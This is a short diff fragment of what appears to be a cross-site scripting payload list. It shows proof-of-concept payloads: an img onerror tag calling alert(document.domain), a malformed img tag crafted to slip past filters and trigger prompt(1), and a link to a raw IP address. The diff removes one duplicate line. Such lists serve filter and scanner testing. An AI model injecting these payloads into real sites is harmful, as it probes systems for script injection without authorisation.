@@ -5,4 +5,3 @@
 <A HREF="http://66.102.7.147/">XSS</A>
 <img src="/" =_=" title="onerror='prompt(1)'">
 <img/src='x'/onerror=alert(document.domain)>
-<img src="/" =_=" title="onerror='prompt(1)'">
